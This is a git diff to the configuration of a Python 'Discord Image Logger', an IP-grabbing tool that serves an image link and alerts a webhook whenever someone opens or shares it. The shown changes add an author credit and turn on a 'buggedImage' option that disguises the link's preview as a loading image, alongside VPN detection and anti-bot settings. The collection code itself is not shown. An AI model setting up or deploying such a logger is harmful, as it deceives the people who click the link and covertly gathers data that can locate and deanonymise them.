@@ -1,4 +1,5 @@
 # Discord Image Logger
+# By DeKrypt | https://github.com/dekrypted
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -15,7 +16,7 @@ config = {
     "image": "https://cdn.discordapp.com/attachments/1363920887019077895/1363930639178400017/vbhhgjhgj.png?ex=6807d2e4&is=68068164&hm=ae068836d1df575c04818f0c19014b76ed6d6beb81cd4bdb902f05281819d137&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
-
+    
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
@@ -37,7 +38,7 @@ config = {
                 # 2 = Don't send an alert when a VPN is suspected
 
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 4, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
